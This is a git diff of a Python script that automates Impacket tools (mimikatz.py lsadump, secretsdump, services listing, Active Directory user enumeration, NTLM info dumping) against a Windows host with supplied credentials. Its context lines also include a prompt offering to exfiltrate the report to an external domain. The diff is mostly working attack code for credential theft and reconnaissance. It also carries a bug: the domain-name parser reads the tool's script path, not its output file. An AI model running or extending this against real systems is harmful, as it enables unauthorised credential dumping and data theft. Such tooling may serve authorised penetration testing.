@@ -12,7 +12,7 @@ req_args.add_argument('-p', '--password', help='The password')#, required=True)
 
 args = parser.parse_args()
 
-# Set up variables
+# Set up variables and functions
 domain = args.domain
 username = args.username
 password = args.password
@@ -22,7 +22,23 @@ secretsdump_path = './impacket/examples/secretsdump.py'
 mimikatz_path = './impacket/examples/mimikatz.py'
 services_path = './impacket/examples/services.py'
 getADUsers_path = './impacket/examples/getADUsers.py'
+dumpNTMLInfo_path = './impacket/examples/DumpNTLMInfo.py'
 
+# Getting the AD Users requires the full DNS domain name for some reason... so we will get it here.
+def get_domain_name(filepath):
+    domain_name = ""
+    try:
+        with open(filepath, 'r') as f:
+            for line in f:
+                if "DNS Domain Name" in line:
+                    extra, domain_name = line.split(':', 1)
+                    domain_name = domain_name.strip()
+                    break
+    except FileNotFoundError:
+        print("NTML Output file not found.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+    return domain_name
 
 # Find out if the report should be exfiltrated
 exfilBool = input("Would you like the generated report to be exfiltrated to an external domain? (y/n)\n")
@@ -63,16 +79,23 @@ try:
 except KeyError as e:
     print(f"There was an error: {e}")
 
+# Dump the NTLM Info
+dumpNTLMCommand = f"py {dumpNTMLInfo_path} {targetIP} >> c:\\temp\\NTLMInfo.txt"
+os.system(dumpNTLMCommand)
+
+domain_name = get_domain_name(dumpNTMLInfo_path)
+
 # Run the mimikatz script, this uses command.txt which elevates the token and does a lsadump.
-mimiCommand = (f"py {mimikatz_path} -f ./command.txt "
-               f"{domain}/{username}:{password}@{targetIP} >> c:\\temp\\mimiOutput.txt")
+mimiCommand = f"py {mimikatz_path} -f ./command.txt "\
+              f"{domain}/{username}:{password}@{targetIP} >> c:\\temp\\mimiOutput.txt"
 os.system(mimiCommand)
 
 # Run services.py script.
-servicesCommand = (f"py {services_path} {domain}/{username}:{password}@{targetIP} list >> c:\\temp\\servicesOutput.txt")
+servicesCommand = f"py {services_path} {domain}/{username}:{password}@{targetIP} list >> c:\\temp\\servicesOutput.txt"
 os.system(servicesCommand)
 
 # Run ADUsers script.
-ADUsersCommand = (f"py {getADUsers_path} {domain}/{username}:{password}@{targetIP} >> c:\\temp\\ADUsersOutput.txt")
+ADUsersCommand = (f"py {getADUsers_path} -all -dc-ip {targetIP} {domain_name}/{username}:{password}"
+                  f" >> c:\\temp\\ADUsersOutput.txt")
 os.system(ADUsersCommand)
 
